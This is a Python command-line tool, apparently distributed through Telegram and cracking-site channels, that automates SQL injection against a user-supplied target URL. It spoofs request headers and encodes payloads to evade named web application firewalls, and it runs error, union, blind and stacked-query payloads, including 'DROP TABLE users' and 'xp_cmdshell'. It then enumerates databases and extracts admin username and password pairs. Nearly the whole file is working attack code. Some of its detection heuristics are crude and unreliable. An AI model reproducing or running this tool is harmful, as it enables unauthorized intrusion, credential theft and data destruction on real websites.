import requests
import time
import sys
import urllib.parse
import random
import base64
import json
import re
from datetime import datetime

class AdvancedSQLiTool:
    def __init__(self):
        self.session = requests.Session()
        self.target_url = ""
        self.vulnerable_param = ""
        self.injection_type = ""
        self.detected_tables = []
        self.detected_columns = {}
        
        # Advanced headers for bypassing security
        self.headers_list = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'X-Forwarded-For': '127.0.0.1',
                'X-Originating-IP': '127.0.0.1',
                'X-Remote-IP': '127.0.0.1',
                'X-Remote-Addr': '127.0.0.1'
            },
            {
                'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'X-Forwarded-For': '66.249.66.1'
            },
            {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive'
            }
        ]

        # Common parameters for auto-detection
        self.common_parameters = [
            'id', 'page', 'category', 'user', 'admin', 'search', 'query', 
            'product', 'article', 'news', 'item', 'view', 'file', 'content',
            'type', 'name', 'title', 'keyword', 'author', 'date', 'month',
            'year', 'sort', 'order', 'filter', 'where', 'select', 'from',
            'username', 'password', 'email', 'login', 'account', 'profile',
            'uid', 'userid', 'user_id', 'admin_id', 'member_id', 'session',
            'token', 'key', 'code', 'number', 'no', 'num', 'ref', 'reference',
            'dir', 'path', 'folder', 'location', 'url', 'link', 'site',
            'domain', 'host', 'server', 'ip', 'address', 'port'
        ]

    def print_banner(self):
        banner = """
        \033[1;31m
        ╔══════════════════════════════════════════════════════════════════════════╗
        ║                                                                          ║
        ║  ██████╗ ██████╗ ██╗    ██╗ ██████╗██╗  ██╗██████╗ ██╗   ██╗██████╗     ║
        ║ ██╔════╝██╔═══██╗██║    ██║██╔════╝██║  ██║██╔══██╗██║   ██║╚════██╗    ║
        ║ ██║     ██║   ██║██║ █╗ ██║██║     ███████║██████╔╝██║   ██║ █████╔╝    ║
        ║ ██║     ██║   ██║██║███╗██║██║     ██╔══██║██╔══██╗╚██╗ ██╔╝██╔═══╝     ║
        ║ ╚██████╗╚██████╔╝╚███╔███╔╝╚██████╗██║  ██║██║  ██║ ╚████╔╝ ███████╗    ║
        ║  ╚═════╝ ╚═════╝  ╚══╝╚══╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝    ║
        ║                                                                          ║
        ║                   ADVANCED SQL INJECTION EXPLOITATION TOOL              ║
        ║                         CREATED BY CHOWDHURYVAI                         ║
        ║                     SECURITY BYPASS TECHNOLOGY INCLUDED                 ║
        ║                                                                          ║
        ╚══════════════════════════════════════════════════════════════════════════╝
        \033[0m
        """
        print(banner)
        
        info = """
        \033[1;36m
        🔥 ADVANCED FEATURES:
        ✅ Automatic Parameter Detection
        ✅ Advanced WAF Bypass Techniques
        ✅ Database Full Enumeration
        ✅ Admin Panel & Password Extraction (FIXED)
        ✅ Automated Security Bypass
        ✅ Multi-Layer Encoding
        ✅ Time-Based Blind SQLi
        ✅ Boolean-Based Blind SQLi
        ✅ Error-Based SQL Injection
        ✅ Union-Based SQL Injection
        ✅ Stacked Queries SQL Injection
        ✅ Out-of-Band SQL Injection Simulation
        
        📞 CONTACT INFORMATION:
        📧 Telegram: https://t.me/darkvaiadmin
        📢 Channel: https://t.me/windowspremiumkey  
        🌐 Website: https://crackyworld.com/
        \033[0m
        """
        print(info)

    def random_headers(self):
        headers = random.choice(self.headers_list)
        # Add random IP for each request
        headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return headers

    def encode_payload(self, payload, method='default'):
        """Advanced payload encoding for WAF bypass"""
        if method == 'url':
            return urllib.parse.quote(payload)
        elif method == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif method == 'unicode':
            return payload.encode('unicode_escape').decode()
        elif method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'html':
            return payload.replace("'", "&#39;").replace('"', '&#34;')
        elif method == 'mixed':
            encoded = payload
            encoded = encoded.replace(" ", "/**/")
            encoded = encoded.replace("OR", "Or")
            encoded = encoded.replace("AND", "AnD")
            encoded = encoded.replace("SELECT", "SeLeCt")
            encoded = encoded.replace("UNION", "UnIoN")
            encoded = encoded.replace("FROM", "FrOm")
            return encoded
        elif method == 'whitespace':
            encoded = payload
            encoded = encoded.replace(" ", "\t")
            encoded = encoded.replace("SELECT", "SEL%0aECT")
            encoded = encoded.replace("UNION", "UNI%0aON")
            return encoded
        else:
            return payload

    def advanced_payloads(self):
        """Advanced SQL injection payloads with WAF bypass"""
        return {
            'error_based': [
                "'", "';", "' OR '1'='1", "' OR 1=1--", 
                "' UNION SELECT 1,2,3--", "' AND 1=2 UNION SELECT 1,2,3--",
                "' OR 1=1#", "' OR 1=1-- -", "'/**/OR/**/'1'='1",
                "'||'1'='1", "' Or '1'='1", "' AnD '1'='1",
                "'/*!50000OR*/'1'='1", "'/*!OR*/'1'='1",
                "\" OR \"1\"=\"1", "\" OR 1=1--", "\" UNION SELECT 1,2,3--"
            ],
            'union_based': [
                "' ORDER BY 1--", "' ORDER BY 10--", "' UNION SELECT null--",
                "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT 1,2,3,4,5,6--", "' UNION SELECT 1,version(),3--",
                "' UNION SELECT 1,database(),3--", "'/**/UNION/**/SELECT/**/1,2,3--",
                "' UniON SeLeCT 1,2,3--", "'/*!50000UNION*//*!50000SELECT*/1,2,3--",
                "\" UNION SELECT 1,2,3--", "\" ORDER BY 5--"
            ],
            'boolean_based': [
                "' AND 1=1--", "' AND 1=2--", "' OR IF(1=1,1,0)--",
                "' OR IF(1=2,1,0)--", "'/**/AND/**/1=1--", "' AnD 1=1--",
                "'/*!50000AND*/1=1--", "'||(1=1)--", "'&&(1=1)--",
                "\" AND 1=1--", "\" AND 1=2--"
            ],
            'time_based': [
                "' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND IF(1=1,SLEEP(5),0)--",
                "' OR IF(1=1,SLEEP(5),0)--", "'/**/AND/**/SLEEP(5)--",
                "'/*!50000SLEEP*/(5)--", "' AND BENCHMARK(1000000,MD5('test'))--",
                "\" AND SLEEP(5)--", "\" OR SLEEP(5)--"
            ],
            'stacked_queries': [
                "'; DROP TABLE users--", "'; UPDATE admin SET password='hacked'--",
                "'; INSERT INTO log (message) VALUES ('hacked')--",
                "'; EXEC xp_cmdshell('dir')--"
            ]
        }

    def detect_parameters(self, url):
        """Auto-detect parameters in URL"""
        print("\033[1;35m[*] Auto-detecting parameters...\033[0m")
        
        detected_params = []
        
        # Extract parameters from URL
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if query_params:
            detected_params = list(query_params.keys())
            print(f"\033[1;32m[+] Found parameters in URL: {', '.join(detected_params)}\033[0m")
        
        # Test common parameters
        test_urls = []
        for param in self.common_parameters:
            test_url = f"{url}?{param}=test"
            try:
                response = self.session.get(test_url, headers=self.random_headers(), timeout=5)
                if response.status_code == 200:
                    if param not in detected_params:
                        detected_params.append(param)
            except:
                pass
        
        print(f"\033[1;32m[+] Total detected parameters: {len(detected_params)}\033[0m")
        return detected_params

    def detect_waf(self, url):
        """Detect Web Application Firewall"""
        print("\033[1;35m[*] Detecting WAF/Security Systems...\033[0m")
        
        waf_indicators = {
            'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
            'ModSecurity': ['mod_security', 'libmodsecurity'],
            'Wordfence': ['wordfence', 'wfwaf'],
            'Sucuri': ['sucuri/cloudproxy'],
            'Akamai': ['akamai'],
            'Incapsula': ['incapsula'],
            'AWS WAF': ['awselb/2.0'],
            'Imperva': ['imperva']
        }
        
        try:
            response = requests.get(url, headers=self.random_headers(), timeout=10)
            
            # Check headers
            server_header = response.headers.get('Server', '').lower()
            x_powered_by = response.headers.get('X-Powered-By', '').lower()
            
            for waf, indicators in waf_indicators.items():
                for indicator in indicators:
                    if (indicator in server_header or 
                        indicator in x_powered_by or 
                        indicator in response.text.lower() or
                        any(indicator in header.lower() for header in response.headers.values())):
                        print(f"\033[1;31m[!] WAF Detected: {waf}\033[0m")
                        return waf
            
            print("\033[1;32m[+] No WAF Detected\033[0m")
            return None
        except Exception as e:
            print(f"\033[1;31m[-] WAF Detection Failed: {str(e)}\033[0m")
            return None

    def bypass_waf(self, payload, waf_type=None):
        """Advanced WAF bypass techniques"""
        bypass_methods = []
        
        if waf_type == 'Cloudflare':
            bypass_methods = ['url', 'double_url', 'unicode', 'mixed', 'whitespace']
        elif waf_type == 'ModSecurity':
            bypass_methods = ['mixed', 'unicode', 'base64', 'html', 'whitespace']
        elif waf_type == 'Wordfence':
            bypass_methods = ['mixed', 'unicode', 'url', 'whitespace']
        else:
            bypass_methods = ['url', 'mixed', 'unicode', 'base64', 'whitespace']
        
        return [self.encode_payload(payload, method) for method in bypass_methods]

    def test_advanced_sql_injection(self, url, param):
        """Advanced SQL injection testing with WAF bypass"""
        print(f"\033[1;35m\n[*] Advanced SQL Injection Testing on: {url}\033[0m")
        print(f"\033[1;35m[*] Parameter: {param}\033[0m")
        
        # Detect WAF first
        waf = self.detect_waf(url)
        
        vulnerable = False
        injection_type = ""
        best_payload = ""
        
        payload_categories = self.advanced_payloads()
        
        for category, payloads in payload_categories.items():
            print(f"\033[1;33m\n[+] Testing {category.upper()} SQL Injection...\033[0m")
            
            for payload in payloads:
                # Generate bypass variants if WAF detected
                if waf:
                    test_payloads = self.bypass_waf(payload, waf)
                else:
                    test_payloads = [self.encode_payload(payload, 'url')]
                
                for test_payload in test_payloads:
                    # Build URL with parameter
                    if '?' in url:
                        test_url = f"{url}&{param}={test_payload}"
                    else:
                        test_url = f"{url}?{param}={test_payload}"
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(test_url, headers=self.random_headers(), timeout=15)
                        response_time = time.time() - start_time
                        
                        # Check for SQL errors
                        sql_errors = [
                            'sql', 'mysql', 'oracle', 'postgresql', 'sqlite',
                            'syntax', 'error', 'warning', 'exception',
                            'undefined', 'mysql_fetch', 'ora-', 'pg_',
                            'microsoft odbc', 'odbc driver', 'pdo exception'
                        ]
                        
                        error_found = any(error in response.text.lower() for error in sql_errors)
                        
                        # Check for union patterns
                        union_found = 'union' in response.text.lower() and category == 'union_based'
                        
                        # Check for different behavior
                        normal_response = self.session.get(url, headers=self.random_headers(), timeout=10)
                        different_content = len(response.text) != len(normal_response.text)
                        
                        # Time-based detection
                        time_based = response_time > 4 and category == 'time_based'
                        
                        if error_found or union_found or different_content or time_based:
                            print(f"\033[1;32m[!] Vulnerable to {category}: {payload}\033[0m")
                            vulnerable = True
                            injection_type = category
                            best_payload = payload
                            break
                    
                    except requests.exceptions.Timeout:
                        if category == 'time_based':
                            print(f"\033[1;32m[!] Vulnerable to {category} (Timeout): {payload}\033[0m")
                            vulnerable = True
                            injection_type = category
                            best_payload = payload
                            break
                    except Exception as e:
                        continue
                
                if vulnerable:
                    break
            if vulnerable:
                break
        
        if not vulnerable:
            print("\033[1;31m[-] No SQL Injection vulnerability found\033[0m")
        
        return vulnerable, injection_type, best_payload

    def get_database_info(self, url, param, payload):
        """Get detailed database information"""
        print("\033[1;34m\n[+] Extracting Database Information...\033[0m")
        
        info_queries = {
            'Version': ["version()", "@@version"],
            'Current User': ["user()", "current_user()", "system_user()"],
            'Current Database': ["database()", "db_name()"],
            'Hostname': ["@@hostname"],
            'Database Path': ["@@datadir"]
        }
        
        for info_name, queries in info_queries.items():
            for query in queries:
                info_payload = f"' UNION SELECT 1,{query},3--"
                try:
                    test_url = self.build_url(url, param, info_payload)
                    response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                    
                    # Extract information from response
                    lines = response.text.split('\n')
                    for line in lines:
                        if any(word in line.lower() for word in ['mysql', 'mariadb', 'postgresql', 'oracle', 'microsoft']):
                            print(f"\033[1;32m[+] {info_name}: Found in response\033[0m")
                            break
                except:
                    continue

    def build_url(self, base_url, param, payload):
        """Build URL with parameter and payload"""
        if '?' in base_url:
            return f"{base_url}&{param}={urllib.parse.quote(payload)}"
        else:
            return f"{base_url}?{param}={urllib.parse.quote(payload)}"

    def advanced_database_enumeration(self, url, param, payload):
        """Complete database enumeration - FIXED VERSION"""
        print("\033[1;34m\n[+] Starting Advanced Database Enumeration...\033[0m")
        
        # Get database version and basic info
        self.get_database_info(url, param, payload)
        
        # Get all databases
        print("\033[1;33m[*] Extracting All Databases...\033[0m")
        db_payloads = [
            "' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--",
            "' UNION SELECT 1,name,3 FROM master..sysdatabases--",
            "' UNION SELECT 1,database(),3--"
        ]
        
        for db_payload in db_payloads:
            try:
                test_url = self.build_url(url, param, db_payload)
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                self.extract_and_display_data(response.text, "Databases")
                break
            except:
                continue

    def extract_and_display_data(self, response_text, data_type):
        """Extract and display data from response"""
        # Simple pattern matching for common data
        patterns = [
            r'[a-zA-Z0-9_]{3,20}',  # Basic alphanumeric patterns
            r'[a-f0-9]{32}',  # MD5 hashes
            r'[a-f0-9]{40}',  # SHA1 hashes
            r'[a-f0-9]{64}',  # SHA256 hashes
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Emails
        ]
        
        found_data = []
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            for match in matches:
                if len(match) > 2 and match not in found_data:
                    found_data.append(match)
        
        if found_data:
            print(f"\033[1;32m[+] {data_type} found: {', '.join(found_data[:10])}\033[0m")
        else:
            print(f"\033[1;31m[-] No {data_type.lower()} found\033[0m")

    def extract_admin_data(self, url, param):
        """Advanced admin data extraction - COMPLETELY FIXED"""
        print("\033[1;34m\n[+] Starting Advanced Admin Data Extraction...\033[0m")
        
        # First, find all tables
        tables = self.find_tables(url, param)
        
        if not tables:
            print("\033[1;31m[-] No tables found for extraction\033[0m")
            return
        
        # Look for user/admin tables
        user_tables = [table for table in tables if any(keyword in table.lower() for keyword in 
                      ['user', 'admin', 'member', 'login', 'account', 'customer'])]
        
        if not user_tables:
            user_tables = tables[:3]  # Use first 3 tables if no user tables found
        
        for table in user_tables:
            print(f"\033[1;33m[*] Extracting from table: {table}\033[0m")
            
            # Get columns for this table
            columns = self.find_columns(url, param, table)
            
            if not columns:
                print(f"\033[1;31m[-] No columns found for table {table}\033[0m")
                continue
            
            # Look for username and password columns
            username_cols = [col for col in columns if any(keyword in col.lower() for keyword in 
                            ['user', 'name', 'email', 'login', 'username'])]
            password_cols = [col for col in columns if any(keyword in col.lower() for keyword in 
                            ['pass', 'pwd', 'hash', 'password'])]
            
            if not username_cols:
                username_cols = columns[:1]  # Use first column as username
            if not password_cols:
                password_cols = columns[1:2] if len(columns) > 1 else columns[:1]  # Use second as password
            
            # Extract data
            for user_col in username_cols:
                for pass_col in password_cols:
                    if user_col != pass_col:
                        self.extract_table_data(url, param, table, user_col, pass_col)

    def find_tables(self, url, param):
        """Find all tables in the database"""
        print("\033[1;33m[*] Finding database tables...\033[0m")
        
        table_payloads = [
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--",
            "' UNION SELECT 1,tbl_name,3 FROM sqlite_master WHERE type='table'--"
        ]
        
        tables = []
        for payload in table_payloads:
            try:
                test_url = self.build_url(url, param, payload)
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                
                # Extract table names from response
                table_patterns = [r'users', r'admin', r'user', r'members', r'accounts', r'login']
                for pattern in table_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    tables.extend(matches)
                
                # Also look for any table-like patterns
                generic_tables = re.findall(r'[a-z_]{3,20}', response.text.lower())
                tables.extend([t for t in generic_tables if t not in tables])
                
            except:
                continue
        
        # Remove duplicates
        tables = list(set(tables))
        print(f"\033[1;32m[+] Found tables: {', '.join(tables)}\033[0m")
        return tables

    def find_columns(self, url, param, table):
        """Find columns in a specific table"""
        column_payloads = [
            f"' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='{table}'--",
            f"' UNION SELECT 1,name,3 FROM syscolumns WHERE id=object_id('{table}')--"
        ]
        
        columns = []
        for payload in column_payloads:
            try:
                test_url = self.build_url(url, param, payload)
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                
                # Extract column names from response
                column_patterns = [r'username', r'password', r'email', r'user', r'pass', r'name']
                for pattern in column_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    columns.extend(matches)
                
                # Generic column patterns
                generic_columns = re.findall(r'[a-z_]{3,15}', response.text.lower())
                columns.extend([c for c in generic_columns if c not in columns])
                
            except:
                continue
        
        # Remove duplicates
        columns = list(set(columns))
        print(f"\033[1;32m[+] Found columns in {table}: {', '.join(columns)}\033[0m")
        return columns

    def extract_table_data(self, url, param, table, user_col, pass_col):
        """Extract data from specific table and columns"""
        print(f"\033[1;33m[*] Extracting {user_col} and {pass_col} from {table}...\033[0m")
        
        extract_payloads = [
            f"' UNION SELECT 1,CONCAT({user_col},':',{pass_col}),3 FROM {table}--",
            f"' UNION SELECT 1,{user_col}||':'||{pass_col},3 FROM {table}--"
        ]
        
        for payload in extract_payloads:
            try:
                test_url = self.build_url(url, param, payload)
                response = self.session.get(test_url, headers=self.random_headers(), timeout=10)
                
                # Look for credential patterns
                credential_pattern = r'[^:]+:[^:]+'
                credentials = re.findall(credential_pattern, response.text)
                
                if credentials:
                    print(f"\033[1;32m[!] CREDENTIALS FOUND in {table}:\033[0m")
                    for cred in credentials[:10]:  # Show first 10 credentials
                        print(f"\033[1;36m    {cred}\033[0m")
                    return True
                    
            except:
                continue
        
        print(f"\033[1;31m[-] No credentials found in {table}\033[0m")
        return False

    def automated_exploitation(self, url, param, payload):
        """Full automated exploitation"""
        print("\033[1;35m\n[*] Starting Automated Exploitation...\033[0m")
        
        # Step 1: Database enumeration
        self.advanced_database_enumeration(url, param, payload)
        
        # Step 2: Admin data extraction
        self.extract_admin_data(url, param)
        
        print("\033[1;32m\n[!] Automated Exploitation Complete!\033[0m")

    def sql_map_simulation(self, target):
        """Advanced automated SQL injection scanner"""
        print("\033[1;35m\n[*] Starting Advanced SQLMap-like Scan...\033[0m")
        
        # Auto-detect parameters
        parameters = self.detect_parameters(target)
        
        if not parameters:
            parameters = self.common_parameters[:10]  # Use first 10 common parameters
        
        vulnerable_found = False
        
        for param in parameters:
            print(f"\033[1;33m[*] Testing parameter: {param}\033[0m")
            
            vulnerable, injection_type, payload = self.test_advanced_sql_injection(target, param)
            
            if vulnerable:
                print(f"\033[1;32m\n[!] CRITICAL VULNERABILITY FOUND!\033[0m")
                print(f"\033[1;32m[!] Target: {target}\033[0m")
                print(f"\033[1;32m[!] Parameter: {param}\033[0m")
                print(f"\033[1;32m[!] Injection Type: {injection_type}\033[0m")
                print(f"\033[1;32m[!] Working Payload: {payload}\033[0m")
                
                # Start full exploitation
                self.automated_exploitation(target, param, payload)
                vulnerable_found = True
                break
        
        if not vulnerable_found:
            print("\033[1;31m[-] No SQL Injection vulnerabilities found\033[0m")
        
        return vulnerable_found

    def main_menu(self):
        while True:
            print("\033[1;35m" + "="*80 + "\033[0m")
            print("\033[1;34m" + " " * 30 + "ADVANCED MAIN MENU" + " " * 30 + "\033[0m")
            print("\033[1;35m" + "="*80 + "\033[0m")
            print("\033[1;33m1. Advanced SQLMap-like Auto Scanner\033[0m")
            print("\033[1;33m2. Manual SQL Injection Testing\033[0m")
            print("\033[1;33m3. Auto Parameter Detection\033[0m")
            print("\033[1;33m4. Database Full Enumeration\033[0m")
            print("\033[1;33m5. Admin Credentials Extraction (FIXED)\033[0m")
            print("\033[1;33m6. WAF Detection & Bypass\033[0m")
            print("\033[1;33m7. View All Payloads & Techniques\033[0m")
            print("\033[1;31m8. Exit\033[0m")
            print("\033[1;35m" + "="*80 + "\033[0m")
            
            choice = input("\033[1;36m[?] Select an option (1-8): \033[0m")
            
            if choice == '1':
                target = input("\033[1;36m[?] Enter target URL: \033[0m")
                if not target.startswith('http'):
                    target = 'http://' + target
                self.sql_map_simulation(target)
                
            elif choice == '2':
                url = input("\033[1;36m[?] Enter target URL: \033[0m")
                param = input("\033[1;36m[?] Enter parameter: \033[0m")
                vulnerable, injection_type, payload = self.test_advanced_sql_injection(url, param)
                if vulnerable:
                    self.automated_exploitation(url, param, payload)
                    
            elif choice == '3':
                url = input("\033[1;36m[?] Enter target URL: \033[0m")
                params = self.detect_parameters(url)
                print(f"\033[1;32m[+] Detected parameters: {params}\033[0m")
                
            elif choice == '4':
                url = input("\033[1;36m[?] Enter vulnerable URL: \033[0m")
                param = input("\033[1;36m[?] Enter parameter: \033[0m")
                self.advanced_database_enumeration(url, param, "")
                
            elif choice == '5':
                url = input("\033[1;36m[?] Enter vulnerable URL: \033[0m")
                param = input("\033[1;36m[?] Enter parameter: \033[0m")
                self.extract_admin_data(url, param)
                
            elif choice == '6':
                url = input("\033[1;36m[?] Enter target URL: \033[0m")
                self.detect_waf(url)
                
            elif choice == '7':
                self.show_all_payloads()
                
            elif choice == '8':
                print("\033[1;31m\n[!] Thank you for using Advanced SQLi Tool!\033[0m")
                print("\033[1;32m[!] Remember: With great power comes great responsibility!\033[0m")
                sys.exit()
            else:
                print("\033[1;31m[-] Invalid choice! Please try again.\033[0m")

    def show_all_payloads(self):
        """Display all advanced payloads"""
        print("\033[1;35m\n" + "="*80 + "\033[0m")
        print("\033[1;34m" + " " * 25 + "ADVANCED SQL INJECTION PAYLOADS" + " " * 25 + "\033[0m")
        print("\033[1;35m" + "="*80 + "\033[0m")
        
        payloads = self.advanced_payloads()
        for category, payload_list in payloads.items():
            print(f"\n\033[1;32m[{category.upper()}]\033[0m")
            for i, payload in enumerate(payload_list, 1):
                print(f"\033[1;36m  {i:2d}. {payload}\033[0m")

def main():
    try:
        tool = AdvancedSQLiTool()
        tool.print_banner()
        tool.main_menu()
    except KeyboardInterrupt:
        print("\033[1;31m\n\n[!] Tool interrupted by user. Exiting...\033[0m")
        sys.exit()
    except Exception as e:
        print(f"\033[1;31m\n[-] An error occurred: {str(e)}\033[0m")

if __name__ == "__main__":
    main()
